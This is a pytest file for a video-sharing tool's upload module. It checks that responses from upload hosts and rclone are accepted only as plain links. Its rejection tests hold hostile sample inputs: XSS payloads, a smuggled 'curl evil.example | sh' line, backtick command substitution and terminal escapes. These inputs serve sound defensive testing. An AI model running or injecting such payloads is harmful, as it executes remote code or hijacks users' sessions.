"""What comes back from an upload is a link and nothing else.

The answer of an upload host (Litterbox, or whatever `endpoint` names) and the output of
`rclone link` are copied to the clipboard, saved in the share history and shown in the
editor. A host that answers with markup, or with a second line that would run when the
"link" is pasted into a terminal, is an upload error; nothing of it is kept.
"""
import http.server
import json
import os
import stat
import sys
import threading
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
import dolly.share as share  # noqa: E402
from dolly.share import clipboard, targets  # noqa: E402

GOOD = ["https://litter.catbox.moe/abc123.mp4",
        "https://drive.google.com/open?id=1AbC_dEf-GhI",
        "https://www.dropbox.com/s/abc123/demo.mp4?dl=0",
        "http://localhost:9000/bucket/2026/11/demo-1a2b3c4d.mp4",
        "https://example.com/a(1)/it's~fine,really;ok=1&x=%20#t=3"]
BAD = ["http://l.example/<img src=x onerror=alert(1)>",
       'https://l.example/"onmouseover="x',
       "https://l.example/a.mp4\ncurl evil.example | sh",
       "https://l.example/a b.mp4",
       "https://l.example/a\x1b[2Jb",
       "https://l.example/café`id`",
       "javascript:alert(1)//http://x",
       "data:text/html,<script>1</script>",
       "http:///no-host",
       "httpx://l.example/a",
       "https://l.example/" + "a" * (targets.MAX_LINK + 1),
       "", None, 5, "<html><body>503 Service Unavailable</body></html>"]


def test_checked_link():
    for u in GOOD:
        assert targets.checked_link(f"  {u}\n") == u
    for u in BAD:
        with pytest.raises(targets.UploadError):
            targets.checked_link(u)


def test_a_presigned_link_with_a_session_token_passes():
    url = targets.presign("GET", "", "eu-central-1", "bucket", "2026/11/demo take.mp4", "AKIAEXAMPLE", "secret",
                          session_token="F" * 1800 + "+/=")
    assert len(url) > 2048 and targets.checked_link(url) == url


def fake_host(answer: bytes):
    class H(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            self.rfile.read(int(self.headers["Content-Length"]))
            self.send_response(200)
            self.end_headers()
            self.wfile.write(answer)

        def log_message(self, *a):
            pass
    srv = http.server.HTTPServer(("127.0.0.1", 0), H)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


@pytest.fixture()
def setup(tmp_path, monkeypatch):
    """A recording folder, a share config with one Litterbox-style target, a clipboard to look at."""
    copied = []
    monkeypatch.setattr(clipboard, "copy_text", lambda s: copied.append(s))
    monkeypatch.setenv("XDG_STATE_HOME", str(tmp_path / "state"))
    pdir = tmp_path / "take"
    pdir.mkdir()
    f = pdir / "t.mp4"
    f.write_bytes(b"VIDEO")
    started = []

    def use(answer: bytes):
        srv = fake_host(answer)
        started.append(srv)
        cfg = tmp_path / "share.json"
        cfg.write_text(json.dumps({"targets": {"tmp": {"type": "litterbox", "time": "1h", "public": True,
                       "endpoint": f"http://127.0.0.1:{srv.server_address[1]}/api.php"}}, "default": "tmp"}))
        cfg.chmod(0o600)
        monkeypatch.setenv("DOLLY_SHARE_CONFIG", str(cfg))
    yield pdir, f, copied, use
    for srv in started:
        srv.shutdown()
        srv.server_close()


@pytest.mark.parametrize("answer", [
    b"http://l.example/<img src=x onerror=fetch('/api/library/trash?t='+TOKEN)>",
    b"https://l.example/a.mp4\ncurl -s evil.example/x | sh\n",
    b"https://l.example/" + b"A" * 100_000,
])
def test_a_host_that_answers_with_more_than_a_link_is_an_error(setup, answer):
    pdir, f, copied, use = setup
    use(answer)
    with pytest.raises(targets.UploadError):
        share.upload(pdir, f)
    assert copied == [] and share.history(pdir) == [] and not (pdir / "shares.json").exists()
    log = Path(os.environ["XDG_STATE_HOME"]) / "dolly" / "shares.jsonl"
    assert not log.exists() or log.read_text() == ""


def test_a_plain_link_is_kept_and_the_history_is_private(setup):
    pdir, f, copied, use = setup
    use(b"https://litter.catbox.moe/abc123.mp4\n")
    (pdir / "shares.json").write_text("[]")
    (pdir / "shares.json").chmod(0o644)                    # as an older version left it
    e = share.upload(pdir, f)
    assert e["url"] == "https://litter.catbox.moe/abc123.mp4" and copied == [e["url"]]
    assert [x["url"] for x in share.history(pdir)] == [e["url"]]
    log = Path(os.environ["XDG_STATE_HOME"]) / "dolly" / "shares.jsonl"
    for p in (pdir / "shares.json", log):
        assert stat.S_IMODE(p.stat().st_mode) == 0o600, p


def test_a_target_whose_result_is_not_a_link_keeps_the_upload_without_it(setup, monkeypatch):
    """An S3 target with a broken public_base_url, say: the file is uploaded, so the entry
    stays (it can be deleted from the history), but what is not a link is not stored."""
    pdir, f, copied, use = setup
    use(b"unused")

    class Odd:
        name, kind = "odd", "s3"

        def upload(self, path):
            return {"url": "https://cdn.example/a b<i>.mp4", "public": True, "deletable": True,
                    "remote_ref": {"bucket": "b", "key": "k"}}
    monkeypatch.setattr(targets, "get_target", lambda name=None: Odd())
    e = share.upload(pdir, f)
    assert e["url"] is None and e["remote_ref"] == {"bucket": "b", "key": "k"} and "usable link" in e["note"]
    assert copied == [] and "<i>" not in (pdir / "shares.json").read_text()


def test_rclone_output_that_is_not_a_link_is_not_kept_as_one(tmp_path):
    fake = tmp_path / "rclone"
    fake.write_text('#!/bin/sh\n[ "$1" = link ] && printf \'%s\\n\' "NOTICE: something" "<b onclick=x>not a link</b>"\nexit 0\n')
    fake.chmod(0o755)
    f = tmp_path / "l.mp4"
    f.write_bytes(b"abc")
    res = targets.RcloneTarget("r", {"type": "rclone", "remote": "r:x", "rclone": str(fake)}).upload(f)
    assert res["url"] is None and res["public"] is False and "cannot make links" in res["note"]


def test_history_that_is_not_a_list_of_entries_is_ignored(tmp_path):
    (tmp_path / "shares.json").write_text('[null, 3, "x", {"id": "ab", "action": "upload"}]')
    assert share.history(tmp_path) == [{"id": "ab", "action": "upload"}]
    (tmp_path / "shares.json").write_text('{"not": "a list"}')
    assert share.history(tmp_path) == []
